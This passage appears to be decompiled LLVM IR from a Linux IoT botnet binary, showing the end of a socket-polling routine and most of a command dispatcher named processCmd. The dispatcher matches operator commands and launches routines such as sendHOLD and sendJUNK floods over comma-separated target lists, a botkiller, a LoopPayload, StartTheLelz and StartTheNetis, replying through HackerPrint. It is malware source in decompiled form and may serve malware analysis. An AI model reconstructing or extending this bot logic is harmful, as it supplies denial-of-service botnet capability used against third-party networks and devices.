  %v7_11744 = load i32, i32* %v6_11718, align 8
  %v1_11748 = urem i32 %v7_11744, 32
  %v6_11750 = shl i32 1, %v1_11748
  %v2_11754 = or i32 %v6_11750, %v2_11738
  store i32 %v2_11754, i32* %v1_11738, align 4
  store i32 0, i32* %stack_var_-216, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_1178c = load i32, i32* %v6_11718, align 8
  %v1_11790 = add i32 %v7_1178c, 1
  store i32 %v1_11790, i32* %r2.global-to-local, align 4
  %v1_1179c = load i32, i32* @sp, align 4
  %v2_1179c = inttoptr i32 %v1_1179c to i32*
  store i32 %v2_11798, i32* %v2_1179c, align 4
  %v0_117a0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_116d4, i32* %r2.global-to-local, align 4
  %v4_117b0 = load i32, i32* %stack_var_-216, align 4
  %v5_117b0 = call i32 @__libc_select(i32 %v0_117a0, i32 0, i32 %v2_116d4, i32 0, i32 %v4_117b0)
  %v7_117c0 = icmp eq i32 %v5_117b0, 1
  br i1 %v7_117c0, label %dec_label_pc_117c8, label %dec_label_pc_11864

dec_label_pc_117c8:                               ; preds = %dec_label_pc_11710
  store i32 4, i32* %stack_var_-220, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_117d8 = load i32, i32* %v6_11718, align 8
  store i32 %v7_117d8, i32* %r2.global-to-local, align 4
  %v1_117e4 = load i32, i32* @sp, align 4
  %v2_117e4 = inttoptr i32 %v1_117e4 to i32*
  store i32 %v2_117e0, i32* %v2_117e4, align 4
  %v0_117e8 = load i32, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_117f8 = load i32, i32* %stack_var_-220, align 4
  %v5_117f8 = call i32 @getsockopt(i32 %v0_117e8, i32 1, i32 4, i32 %v2_117dc, i32 %v4_117f8)
  %v3_117fc = load i32, i32* %stack_var_-224, align 4
  %v2_11800 = icmp eq i32 %v3_117fc, 0
  br i1 %v2_11800, label %dec_label_pc_11840, label %dec_label_pc_11808

dec_label_pc_11808:                               ; preds = %dec_label_pc_117c8
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_11810 = load i32, i32* %v6_11718, align 8
  %v1_11818 = call i32 @__GI___libc_close(i32 %v7_11810)
  store i32 %v2_115c4, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_115c8, align 4
  br label %dec_label_pc_119d0

dec_label_pc_11840:                               ; preds = %dec_label_pc_117c8
  store i32 %v2_115c4, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_115c8, align 4
  br label %dec_label_pc_119d0

dec_label_pc_11864:                               ; preds = %dec_label_pc_11710
  %v3_11868 = icmp eq i32 %v5_117b0, -1
  br i1 %v3_11868, label %dec_label_pc_11870, label %dec_label_pc_119d0

dec_label_pc_11870:                               ; preds = %dec_label_pc_11864
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_11878 = load i32, i32* %v6_11718, align 8
  %v1_11880 = call i32 @__GI___libc_close(i32 %v7_11878)
  store i32 %v2_115c4, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_115c8, align 4
  br label %dec_label_pc_119d0

dec_label_pc_118bc.lr.ph:                         ; preds = %dec_label_pc_115dc
  br label %dec_label_pc_118bc

dec_label_pc_118bc:                               ; preds = %dec_label_pc_118bc.lr.ph, %dec_label_pc_118bc
  %storemerge49 = phi i32 [ 0, %dec_label_pc_118bc.lr.ph ], [ %v1_118d0, %dec_label_pc_118bc ]
  store i32 %v2_116d4, i32* %r2.global-to-local, align 4
  %v5_118c8 = mul nuw nsw i32 %storemerge49, 4
  %v6_118c8 = add i32 %v5_118c8, %v2_116d4
  %v7_118c8 = inttoptr i32 %v6_118c8 to i32*
  store i32 0, i32* %v7_118c8, align 4
  %v1_118d0 = add nuw nsw i32 %storemerge49, 1
  %tmp48 = icmp ult i32 %v1_118d0, 32
  br i1 %tmp48, label %dec_label_pc_118bc, label %dec_label_pc_118e4

dec_label_pc_118e4:                               ; preds = %dec_label_pc_118bc
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v6_118ec = inttoptr i32 %v2_115c0 to i32*
  %v7_118ec = load i32, i32* %v6_118ec, align 8
  %v3_118f0 = udiv i32 %v7_118ec, 32
  store i32 -184, i32* %r2.global-to-local, align 4
  %v3_118fc = mul nuw nsw i32 %v3_118f0, 4
  %v2_11908 = add i32 %v2_11730, %v3_118fc
  %v1_1190c = inttoptr i32 %v2_11908 to i32*
  %v2_1190c = load i32, i32* %v1_1190c, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_11918 = load i32, i32* %v6_118ec, align 8
  %v1_1191c = urem i32 %v7_11918, 32
  %v6_11924 = shl i32 1, %v1_1191c
  %v2_11928 = or i32 %v6_11924, %v2_1190c
  store i32 %v2_11928, i32* %v1_1190c, align 4
  store i32 0, i32* %stack_var_-216, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_11960 = load i32, i32* %v6_118ec, align 8
  %v1_11964 = add i32 %v7_11960, 1
  store i32 %v1_11964, i32* %r2.global-to-local, align 4
  %v1_11970 = load i32, i32* @sp, align 4
  %v2_11970 = inttoptr i32 %v1_11970 to i32*
  store i32 %v2_11798, i32* %v2_11970, align 4
  %v0_11974 = load i32, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_11984 = load i32, i32* %stack_var_-216, align 4
  %v5_11984 = call i32 @__libc_select(i32 %v0_11974, i32 0, i32 0, i32 %v2_116d4, i32 %v4_11984)
  %v2_11994 = icmp eq i32 %v5_11984, 0
  br i1 %v2_11994, label %dec_label_pc_119d0, label %dec_label_pc_1199c

dec_label_pc_1199c:                               ; preds = %dec_label_pc_118e4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_119a4 = load i32, i32* %v6_118ec, align 8
  %v1_119ac = call i32 @__GI___libc_close(i32 %v7_119a4)
  store i32 %v2_115c4, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_115c8, align 4
  br label %dec_label_pc_119d0

dec_label_pc_119d0:                               ; preds = %dec_label_pc_115e8, %dec_label_pc_11864, %dec_label_pc_118e4, %dec_label_pc_11870, %dec_label_pc_11840, %dec_label_pc_11808, %dec_label_pc_116b0, %dec_label_pc_11698, %dec_label_pc_1199c
  %v1_119d4 = add nuw nsw i32 %storemerge357, 1
  store i32 %v1_119d4, i32* %r2.global-to-local, align 4
  %v5_119e8 = icmp slt i32 %v1_119d4, %v3_1149c
  br i1 %v5_119e8, label %dec_label_pc_115b0, label %dec_label_pc_119ec

dec_label_pc_119ec:                               ; preds = %dec_label_pc_119dc.preheader, %dec_label_pc_119d0, %dec_label_pc_114ec
  %v2_119f0 = call i32 @__GI_time(i32* null)
  store i32 %v2_119f0, i32* %r2.global-to-local, align 4
  %v5_11a00 = icmp slt i32 %v2_119f0, %v2_11598
  br i1 %v5_11a00, label %dec_label_pc_119dc.preheader, label %dec_label_pc_11a04

dec_label_pc_119dc.preheader:                     ; preds = %dec_label_pc_119ec
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_119e454, label %dec_label_pc_115b0, label %dec_label_pc_119ec

dec_label_pc_11a04:                               ; preds = %dec_label_pc_119ec, %entry
  %v1_11a10 = phi i32 [ %v3_114d8, %entry ], [ %v2_119f0, %dec_label_pc_119ec ]
  store i32 %v3_1146c, i32* @r4, align 4
  ret i32 %v1_11a10

; uselistorder directives
  uselistorder i32 %v1_119d4, { 2, 1, 0 }
  uselistorder i32 %storemerge49, { 1, 0 }
  uselistorder i32 %storemerge513, { 1, 0 }
  uselistorder i8* %v1_115c8, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_115c4, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_115c0, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge357, { 1, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 14, 13, 12, 0, 15 }
  uselistorder i32 %v2_116d4, { 2, 0, 3, 6, 5, 1, 4 }
  uselistorder i32 %v2_11554, { 1, 0 }
  uselistorder i32 %v3_11530, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_1149c, { 1, 2, 0 }
  uselistorder i32 %v0_1148c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r2.global-to-local, { 43, 37, 36, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 38, 39, 40, 41, 42, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 8, 7, 6, 2, 5, 4, 3, 1, 0 }
  uselistorder i32 115, { 1, 2, 0, 3, 4 }
  uselistorder i32 ()* @__GI___errno_location, { 5, 4, 3, 1, 2, 0 }
  uselistorder i32 -184, { 1, 2, 0 }
  uselistorder i32 ()* @getdtablesize, { 2, 1, 0 }
  uselistorder label %dec_label_pc_119d0, { 8, 2, 3, 1, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_118bc, { 1, 0 }
  uselistorder label %dec_label_pc_116e8, { 1, 0 }
  uselistorder label %dec_label_pc_11698, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_11a18 = load i32, i32* @r4, align 4
  %v6_11a18 = load i32, i32* @r5, align 4
  %v9_11a18 = load i32, i32* @r6, align 4
  %v12_11a18 = load i32, i32* @r7, align 4
  %v15_11a18 = load i32, i32* @r8, align 4
  %v18_11a18 = load i32, i32* @fp, align 4
  store i32 72224, i32* %stack_var_-4, align 4
  %v2_11a1c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11a1c, i32* @fp, align 4
  %v2_11a30 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_23a88.61 to i32), i32* @r1, align 4
  %v3_11a3c = inttoptr i32 %v2_11a30 to i8*
  %v4_11a3c = call i32 @__GI_strcoll(i8* %v3_11a3c, i32 ptrtoint ([5 x i8]* @global_var_23a88.61 to i32))
  %v2_11a44 = icmp eq i32 %v4_11a3c, 0
  br i1 %v2_11a44, label %dec_label_pc_11a4c, label %dec_label_pc_11a64

dec_label_pc_11a4c:                               ; preds = %entry
  %v2_11a50 = load i32, i32* @global_var_324c8.59, align 4
  %v3_11a5c = call i32 @HackerPrint(i32 %v2_11a50, i32 ptrtoint ([6 x i8]* @global_var_27fc0.1211 to i32))
  br label %dec_label_pc_12d7c

dec_label_pc_11a64:                               ; preds = %entry
  %v2_11a68 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_27fc8.1213 to i32), i32* @r1, align 4
  %v3_11a74 = inttoptr i32 %v2_11a68 to i8*
  %v4_11a74 = call i32 @__GI_strcoll(i8* %v3_11a74, i32 ptrtoint ([11 x i8]* @global_var_27fc8.1213 to i32))
  %v2_11a7c = icmp eq i32 %v4_11a74, 0
  br i1 %v2_11a7c, label %dec_label_pc_11a84, label %dec_label_pc_11ab0

dec_label_pc_11a84:                               ; preds = %dec_label_pc_11a64
  %v2_11a88 = load i32, i32* @global_var_324c8.59, align 4
  store i32 %v2_11a88, i32* @r4, align 4
  %v2_11a90 = load i32, i32* @global_var_391e8.487, align 4
  store i32 %v2_11a90, i32* @r0, align 4
  %v1_11a94 = call i32 @__GI_inet_ntoa(i32 %v2_11a90)
  %v0_11a9c = load i32, i32* @r4, align 4
  store i32 %v1_11a94, i32* @r2, align 4
  %v3_11aa8 = call i32 @HackerPrint(i32 %v0_11a9c, i32 ptrtoint ([10 x i8]* @global_var_27fd4.1216 to i32))
  br label %dec_label_pc_12d7c

dec_label_pc_11ab0:                               ; preds = %dec_label_pc_11a64
  %v2_11ab4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_27fe0.1218 to i32), i32* @r1, align 4
  %v3_11ac0 = inttoptr i32 %v2_11ab4 to i8*
  %v4_11ac0 = call i32 @__GI_strcoll(i8* %v3_11ac0, i32 ptrtoint ([8 x i8]* @global_var_27fe0.1218 to i32))
  %v2_11ac8 = icmp eq i32 %v4_11ac0, 0
  br i1 %v2_11ac8, label %dec_label_pc_11ad0, label %dec_label_pc_11b04

dec_label_pc_11ad0:                               ; preds = %dec_label_pc_11ab0
  %v0_11ad0 = call i32 @listFork()
  %v2_11ad8 = icmp eq i32 %v0_11ad0, 0
  br i1 %v2_11ad8, label %dec_label_pc_11ae0, label %dec_label_pc_11b04

dec_label_pc_11ae0:                               ; preds = %dec_label_pc_11ad0
  %v2_11ae4 = load i32, i32* @global_var_324c8.59, align 4
  %v3_11af0 = call i32 @HackerPrint(i32 %v2_11ae4, i32 ptrtoint ([13 x i8]* @global_var_27fe8.1220 to i32))
  %v1_11af4 = call i32 @botkiller(i32 %v3_11af0)
  %v1_11af8 = call i32 @RemoveTMP(i32 %v1_11af4)
  %v1_11b00 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11b04

dec_label_pc_11b04:                               ; preds = %dec_label_pc_11ad0, %dec_label_pc_11ab0, %dec_label_pc_11ae0
  %v2_11b08 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_27ff8.1222 to i32), i32* @r1, align 4
  %v3_11b14 = inttoptr i32 %v2_11b08 to i8*
  %v4_11b14 = call i32 @__GI_strcoll(i8* %v3_11b14, i32 ptrtoint ([7 x i8]* @global_var_27ff8.1222 to i32))
  %v2_11b1c = icmp eq i32 %v4_11b14, 0
  br i1 %v2_11b1c, label %dec_label_pc_11b24, label %dec_label_pc_11b54

dec_label_pc_11b24:                               ; preds = %dec_label_pc_11b04
  %v0_11b24 = call i32 @listFork()
  %v2_11b2c = icmp eq i32 %v0_11b24, 0
  br i1 %v2_11b2c, label %dec_label_pc_11b34, label %dec_label_pc_11b54

dec_label_pc_11b34:                               ; preds = %dec_label_pc_11b24
  %v2_11b38 = load i32, i32* @global_var_324c8.59, align 4
  %v3_11b44 = call i32 @HackerPrint(i32 %v2_11b38, i32 ptrtoint ([16 x i8]* @global_var_28000.1224 to i32))
  %v1_11b48 = call i32 @LoopPayload(i32 %v3_11b44)
  %v1_11b50 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11b54

dec_label_pc_11b54:                               ; preds = %dec_label_pc_11b24, %dec_label_pc_11b04, %dec_label_pc_11b34
  %v2_11b58 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_28010.1226 to i32), i32* @r1, align 4
  %v3_11b64 = inttoptr i32 %v2_11b58 to i8*
  %v4_11b64 = call i32 @__GI_strcoll(i8* %v3_11b64, i32 ptrtoint ([7 x i8]* @global_var_28010.1226 to i32))
  %v2_11b6c = icmp eq i32 %v4_11b64, 0
  br i1 %v2_11b6c, label %dec_label_pc_11b74, label %dec_label_pc_11c74

dec_label_pc_11b74:                               ; preds = %dec_label_pc_11b54
  %v7_11b78 = icmp eq i32 %arg1, 2
  br i1 %v7_11b78, label %dec_label_pc_11b98, label %dec_label_pc_11b80

dec_label_pc_11b80:                               ; preds = %dec_label_pc_11b74
  %v2_11b84 = load i32, i32* @global_var_324c8.59, align 4
  %v3_11b90 = call i32 @HackerPrint(i32 %v2_11b84, i32 ptrtoint ([16 x i8]* @global_var_28018.1228 to i32))
  br label %dec_label_pc_12d7c

dec_label_pc_11b98:                               ; preds = %dec_label_pc_11b74
  %v1_11b9c = add i32 %tmp, 4
  %v1_11ba0 = inttoptr i32 %v1_11b9c to i32*
  %v2_11ba0 = load i32, i32* %v1_11ba0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_28028.1230 to i32), i32* @r1, align 4
  %v3_11bac = inttoptr i32 %v2_11ba0 to i8*
  %v4_11bac = call i32 @__GI_strcoll(i8* %v3_11bac, i32 ptrtoint ([4 x i8]* @global_var_28028.1230 to i32))
  %v2_11bb4 = icmp eq i32 %v4_11bac, 0
  br i1 %v2_11bb4, label %dec_label_pc_11bbc, label %dec_label_pc_11c00

dec_label_pc_11bbc:                               ; preds = %dec_label_pc_11b98
  %v2_11bc0 = load i32, i32* @global_var_391f0.1232, align 4
  %v2_11bc4 = icmp eq i32 %v2_11bc0, 0
  br i1 %v2_11bc4, label %dec_label_pc_12d7c, label %dec_label_pc_11bcc

dec_label_pc_11bcc:                               ; preds = %dec_label_pc_11bbc
  %v2_11bdc = call i32 @kill(i32 %v2_11bc0, i32 9)
  %v2_11be4 = load i32, i32* @global_var_324c8.59, align 4
  %v3_11bf0 = call i32 @HackerPrint(i32 %v2_11be4, i32 ptrtoint ([5 x i8]* @global_var_2802c.1234 to i32))
  store i32 0, i32* @global_var_391f0.1232, align 4
  br label %dec_label_pc_11c00

dec_label_pc_11c00:                               ; preds = %dec_label_pc_11b98, %dec_label_pc_11bcc
  %v2_11c08 = load i32, i32* %v1_11ba0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_28034.1236 to i32), i32* @r1, align 4
  %v3_11c14 = inttoptr i32 %v2_11c08 to i8*
  %v4_11c14 = call i32 @__GI_strcoll(i8* %v3_11c14, i32 ptrtoint ([3 x i8]* @global_var_28034.1236 to i32))
  %v2_11c1c = icmp eq i32 %v4_11c14, 0
  br i1 %v2_11c1c, label %dec_label_pc_11c24, label %dec_label_pc_11c74

dec_label_pc_11c24:                               ; preds = %dec_label_pc_11c00
  %v2_11c28 = load i32, i32* @global_var_391f0.1232, align 4
  %v2_11c2c = icmp eq i32 %v2_11c28, 0
  br i1 %v2_11c2c, label %dec_label_pc_11c34, label %dec_label_pc_12d7c

dec_label_pc_11c34:                               ; preds = %dec_label_pc_11c24
  %v0_11c34 = call i32 @__libc_fork()
  %v2_11c44 = icmp eq i32 %v0_11c34, 0
  br i1 %v2_11c44, label %dec_label_pc_11c68, label %dec_label_pc_11c4c

dec_label_pc_11c4c:                               ; preds = %dec_label_pc_11c34
  store i32 %v0_11c34, i32* @global_var_391f0.1232, align 4
  br label %dec_label_pc_12d7c

dec_label_pc_11c68:                               ; preds = %dec_label_pc_11c34
  %v0_11c68 = call i32 @StartTheLelz()
  %v1_11c70 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11c74

dec_label_pc_11c74:                               ; preds = %dec_label_pc_11c00, %dec_label_pc_11b54, %dec_label_pc_11c68
  %v2_11c78 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_28038.1238 to i32), i32* @r1, align 4
  %v3_11c84 = inttoptr i32 %v2_11c78 to i8*
  %v4_11c84 = call i32 @__GI_strcoll(i8* %v3_11c84, i32 ptrtoint ([6 x i8]* @global_var_28038.1238 to i32))
  %v2_11c8c = icmp eq i32 %v4_11c84, 0
  br i1 %v2_11c8c, label %dec_label_pc_11c94, label %dec_label_pc_11ce4

dec_label_pc_11c94:                               ; preds = %dec_label_pc_11c74
  %v7_11c98 = icmp eq i32 %arg1, 2
  br i1 %v7_11c98, label %dec_label_pc_11ca0, label %dec_label_pc_12d7c

dec_label_pc_11ca0:                               ; preds = %dec_label_pc_11c94
  %v1_11ca4 = add i32 %tmp, 4
  %v1_11ca8 = inttoptr i32 %v1_11ca4 to i32*
  %v2_11ca8 = load i32, i32* %v1_11ca8, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_28034.1236 to i32), i32* @r1, align 4
  %v3_11cb4 = inttoptr i32 %v2_11ca8 to i8*
  %v4_11cb4 = call i32 @__GI_strcoll(i8* %v3_11cb4, i32 ptrtoint ([3 x i8]* @global_var_28034.1236 to i32))
  %v2_11cbc = icmp eq i32 %v4_11cb4, 0
  br i1 %v2_11cbc, label %dec_label_pc_11cc4, label %dec_label_pc_11ce4

dec_label_pc_11cc4:                               ; preds = %dec_label_pc_11ca0
  %v2_11cc8 = load i32, i32* @global_var_324c8.59, align 4
  %v3_11cd4 = call i32 @HackerPrint(i32 %v2_11cc8, i32 ptrtoint ([25 x i8]* @global_var_28040.1240 to i32))
  %v1_11cd8 = call i32 @StartTheNetis(i32 %v3_11cd4)
  %v1_11ce0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11ce4

dec_label_pc_11ce4:                               ; preds = %dec_label_pc_11ca0, %dec_label_pc_11c74, %dec_label_pc_11cc4
  %v2_11ce8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_2805c.1242 to i32), i32* @r1, align 4
  %v3_11cf4 = inttoptr i32 %v2_11ce8 to i8*
  %v4_11cf4 = call i32 @__GI_strcoll(i8* %v3_11cf4, i32 ptrtoint ([5 x i8]* @global_var_2805c.1242 to i32))
  %v2_11cfc = icmp eq i32 %v4_11cf4, 0
  br i1 %v2_11cfc, label %dec_label_pc_11d04, label %dec_label_pc_11e48

dec_label_pc_11d04:                               ; preds = %dec_label_pc_11ce4
  %v7_11d0c = icmp slt i32 %arg1, 4
  br i1 %v7_11d0c, label %dec_label_pc_12d7c, label %dec_label_pc_11d10

dec_label_pc_11d10:                               ; preds = %dec_label_pc_11d04
  %v1_11d14 = add i32 %tmp, 8
  %v1_11d18 = inttoptr i32 %v1_11d14 to i32*
  %v2_11d18 = load i32, i32* %v1_11d18, align 4
  store i32 %v2_11d18, i32* @r0, align 4
  %v1_11d20 = call i32 @atol(i32 %v2_11d18)
  %tmp114 = icmp slt i32 %v1_11d20, 1
  br i1 %tmp114, label %dec_label_pc_12d7c, label %dec_label_pc_11d30

dec_label_pc_11d30:                               ; preds = %dec_label_pc_11d10
  %v1_11d34 = add i32 %tmp, 12
  %v1_11d38 = inttoptr i32 %v1_11d34 to i32*
  %v2_11d38 = load i32, i32* %v1_11d38, align 4
  store i32 %v2_11d38, i32* @r0, align 4
  %v1_11d40 = call i32 @atol(i32 %v2_11d38)
  %v5_11d4c = icmp sgt i32 %v1_11d40, 0
  br i1 %v5_11d4c, label %dec_label_pc_11d54, label %dec_label_pc_12d7c

dec_label_pc_11d54:                               ; preds = %dec_label_pc_11d30
  %v1_11d58 = add i32 %tmp, 4
  %v1_11d5c = inttoptr i32 %v1_11d58 to i32*
  %v2_11d5c = load i32, i32* %v1_11d5c, align 4
  %v2_11d6c = load i32, i32* %v1_11d18, align 4
  store i32 %v2_11d6c, i32* @r0, align 4
  %v1_11d74 = call i32 @atol(i32 %v2_11d6c)
  %v2_11d88 = load i32, i32* %v1_11d38, align 4
  store i32 %v2_11d88, i32* @r0, align 4
  %v1_11d90 = call i32 @atol(i32 %v2_11d88)
  store i32 %v2_11d5c, i32* @r0, align 4
  %v2_11da8 = call i32 @__GI_strchr(i32 %v2_11d5c, i32 44)
  %v2_11db0 = icmp eq i32 %v2_11da8, 0
  br i1 %v2_11db0, label %dec_label_pc_11e20, label %dec_label_pc_11db8

dec_label_pc_11db8:                               ; preds = %dec_label_pc_11d54
  %v2_11dc4 = call i32 @__GI_strtok(i32 %v2_11d5c, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_11e1450 = icmp eq i32 %v2_11dc4, 0
  br i1 %v2_11e1450, label %dec_label_pc_11e48, label %dec_label_pc_11dd4

dec_label_pc_11dd4:                               ; preds = %dec_label_pc_11db8, %dec_label_pc_11dfc
  %storemerge2851 = phi i32 [ %v2_11e04, %dec_label_pc_11dfc ], [ %v2_11dc4, %dec_label_pc_11db8 ]
  %v0_11dd4 = call i32 @listFork()
  %v2_11ddc = icmp eq i32 %v0_11dd4, 0
  br i1 %v2_11ddc, label %dec_label_pc_11de4, label %dec_label_pc_11dfc

dec_label_pc_11de4:                               ; preds = %dec_label_pc_11dd4
  %v3_11df0 = call i32 @sendHOLD(i32 %storemerge2851, i32 %v1_11d74, i32 %v1_11d90)
  %v1_11df8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11dfc

dec_label_pc_11dfc:                               ; preds = %dec_label_pc_11dd4, %dec_label_pc_11de4
  %v2_11e04 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_11e14 = icmp eq i32 %v2_11e04, 0
  br i1 %v2_11e14, label %dec_label_pc_11e48, label %dec_label_pc_11dd4

dec_label_pc_11e20:                               ; preds = %dec_label_pc_11d54
  %v0_11e20 = call i32 @listFork()
  %v2_11e28 = icmp eq i32 %v0_11e20, 0
  br i1 %v2_11e28, label %dec_label_pc_11e30, label %dec_label_pc_12d7c

dec_label_pc_11e30:                               ; preds = %dec_label_pc_11e20
  %v3_11e3c = call i32 @sendHOLD(i32 %v2_11d5c, i32 %v1_11d74, i32 %v1_11d90)
  %v1_11e44 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11e48

dec_label_pc_11e48:                               ; preds = %dec_label_pc_11dfc, %dec_label_pc_11db8, %dec_label_pc_11ce4, %dec_label_pc_11e30
  %v2_11e4c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_28064.1245 to i32), i32* @r1, align 4
  %v3_11e58 = inttoptr i32 %v2_11e4c to i8*
  %v4_11e58 = call i32 @__GI_strcoll(i8* %v3_11e58, i32 ptrtoint ([5 x i8]* @global_var_28064.1245 to i32))
  %v2_11e60 = icmp eq i32 %v4_11e58, 0
  br i1 %v2_11e60, label %dec_label_pc_11e68, label %dec_label_pc_11fbc

dec_label_pc_11e68:                               ; preds = %dec_label_pc_11e48
  %v7_11e70 = icmp slt i32 %arg1, 4
  br i1 %v7_11e70, label %dec_label_pc_12d7c, label %dec_label_pc_11e74

dec_label_pc_11e74:                               ; preds = %dec_label_pc_11e68
  %v1_11e78 = add i32 %tmp, 8
  %v1_11e7c = inttoptr i32 %v1_11e78 to i32*
  %v2_11e7c = load i32, i32* %v1_11e7c, align 4
  store i32 %v2_11e7c, i32* @r0, align 4
  %v1_11e84 = call i32 @atol(i32 %v2_11e7c)
  %tmp115 = icmp slt i32 %v1_11e84, 1
  br i1 %tmp115, label %dec_label_pc_12d7c, label %dec_label_pc_11e94

dec_label_pc_11e94:                               ; preds = %dec_label_pc_11e74
  %v1_11e98 = add i32 %tmp, 12
  %v1_11e9c = inttoptr i32 %v1_11e98 to i32*
  %v2_11e9c = load i32, i32* %v1_11e9c, align 4
  store i32 %v2_11e9c, i32* @r0, align 4
  %v1_11ea4 = call i32 @atol(i32 %v2_11e9c)
  %v5_11eb0 = icmp sgt i32 %v1_11ea4, 0
  br i1 %v5_11eb0, label %dec_label_pc_11eb8, label %dec_label_pc_12d7c

dec_label_pc_11eb8:                               ; preds = %dec_label_pc_11e94
  %v1_11ebc = add i32 %tmp, 4
  %v1_11ec0 = inttoptr i32 %v1_11ebc to i32*
  %v2_11ec0 = load i32, i32* %v1_11ec0, align 4
  %v2_11ed0 = load i32, i32* %v1_11e7c, align 4
  store i32 %v2_11ed0, i32* @r0, align 4
  %v1_11ed8 = call i32 @atol(i32 %v2_11ed0)
  %v2_11eec = load i32, i32* %v1_11e9c, align 4
  store i32 %v2_11eec, i32* @r0, align 4
  %v1_11ef4 = call i32 @atol(i32 %v2_11eec)
  store i32 %v2_11ec0, i32* @r0, align 4
  %v2_11f0c = call i32 @__GI_strchr(i32 %v2_11ec0, i32 44)
  %v2_11f14 = icmp eq i32 %v2_11f0c, 0
  br i1 %v2_11f14, label %dec_label_pc_11f94, label %dec_label_pc_11f1c

dec_label_pc_11f1c:                               ; preds = %dec_label_pc_11eb8
  %v2_11f28 = call i32 @__GI_strtok(i32 %v2_11ec0, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_11f8847 = icmp eq i32 %v2_11f28, 0
  br i1 %v2_11f8847, label %dec_label_pc_11fbc, label %dec_label_pc_11f38

dec_label_pc_11f38:                               ; preds = %dec_label_pc_11f1c, %dec_label_pc_11f70
  %storemerge2648 = phi i32 [ %v2_11f78, %dec_label_pc_11f70 ], [ %v2_11f28, %dec_label_pc_11f1c ]
  %v0_11f38 = call i32 @listFork()
  %v2_11f40 = icmp eq i32 %v0_11f38, 0
  br i1 %v2_11f40, label %dec_label_pc_11f48, label %dec_label_pc_11f70

dec_label_pc_11f48:                               ; preds = %dec_label_pc_11f38
  %v4_11f54 = call i32 @sendJUNK(i32 %storemerge2648, i32 %v1_11ed8, i32 %v1_11ef4, i32 0)
  %v2_11f5c = load i32, i32* @global_var_324c8.59, align 4
  %v1_11f64 = call i32 @__GI___libc_close(i32 %v2_11f5c)
  %v1_11f6c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11f70

dec_label_pc_11f70:                               ; preds = %dec_label_pc_11f38, %dec_label_pc_11f48
  %v2_11f78 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_11f88 = icmp eq i32 %v2_11f78, 0
  br i1 %v2_11f88, label %dec_label_pc_11fbc, label %dec_label_pc_11f38

dec_label_pc_11f94:                               ; preds = %dec_label_pc_11eb8
  %v0_11f94 = call i32 @listFork()
  %v2_11f9c = icmp eq i32 %v0_11f94, 0
  br i1 %v2_11f9c, label %dec_label_pc_11fa4, label %dec_label_pc_12d7c

dec_label_pc_11fa4:                               ; preds = %dec_label_pc_11f94
  %v4_11fb0 = call i32 @sendJUNK(i32 %v2_11ec0, i32 %v1_11ed8, i32 %v1_11ef4, i32 0)
  %v1_11fb8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11fbc

